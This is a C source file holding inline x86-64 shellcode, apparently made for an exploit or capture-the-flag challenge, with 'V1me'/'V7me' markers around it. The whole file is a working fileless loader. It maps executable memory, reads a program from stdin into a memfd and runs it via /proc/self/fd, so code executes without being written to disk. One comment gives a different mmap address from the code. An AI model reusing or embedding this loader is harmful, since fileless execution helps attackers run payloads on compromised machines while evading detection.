// gcc shellcode.c -O0 -o sc
#include <unistd.h>

int main() {
    __asm__ __volatile__(

        // magic
        ".ascii \"V1me\";\n"

        ".intel_syntax noprefix\n"
        "nop;\n"
        "nop;\n"
        "nop;\n"
        "nop;\n"
        "nop;\n"
        // x86-64        rdi   rsi   rdx   r10   r8    r9    -
        // bin_buf = mmap(0x23333000, 0x100000, 7, 0x22, -1, 0)

        "mov rdi, 0x23335000;\n"
        "mov rsi, 0x100000;\n"
        "mov rdx, 0x7;\n"
        "mov r10, 0x22;\n"
        "mov r8, -1;\n"
        "mov r9, 0;\n"
        "mov rax, 9;\n"
        "syscall;\n"

        // store bin_buf 
        "push rax;\n"

        //read(0, bin_buf, 0x100000)
        "mov rdi, 0;\n"
        "mov rsi, rax;\n"
        "mov rdx, 0x100000;\n"
        "mov rax, 0;\n"
        "syscall;\n"

        // memfd_create("", MFD_CLOEXEC)
        "mov rax, 319;\n"
        "lea rdi, [rip+0x500];\n"
        "mov qword ptr [rdi], 0;\n"
        "mov rsi, 1;\n"
        "mov rax, 319;\n"
        "syscall;\n"

        // store memfd
        "push rax;\n"

        // write(memfd, bin_buf, sizeof(bin_buf)) 
        "pop rdi;\n"
        "pop rsi;\n"
        "push rdi;\n"
        "mov rdx, 0x100000;\n"
        "mov rax, 1;\n"
        "syscall;\n"

        // place file name (/proc/self/fd/${mem_fd}) in memery
        "lea rdi, [rip+0x600];\n"
        "mov rbx, 0x65732f636f72702f;\n"
        "mov qword ptr [rdi], rbx;\n"
        "mov rbx, 0x2f64662f666c;\n"
        "mov qword ptr [rdi+8], rbx;\n"
        "pop rax;\n"
        "add rax, 0x30;\n"
        "mov byte ptr [rdi+0xe], al;\n"
        "xor rax, rax;\n"
        "mov byte ptr [rdi+0xf], al;\n"
        
        // execve("/proc/self/fd/${mem_fd}", NULL, NULL)
        "mov rsi, 0;\n"
        "mov rdx, 0;\n"
        "mov rax, 59;\n"
        "syscall;\n"

        // just stuck here with read syscall
        "mov rdi, 0;\n"
        "lea rsi, [rip + 0x700];\n"
        "mov rdx, 0x100000;\n"
        "mov rax, 0;\n"
        "syscall;\n"

        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"
        "xor rax, rax;\n"

        ".att_syntax prefix\n"

        ".byte 0xff,0xff,0xff,0xff\n"
        ".ascii \"V7me\"\n"
        :
        :
        :);
}
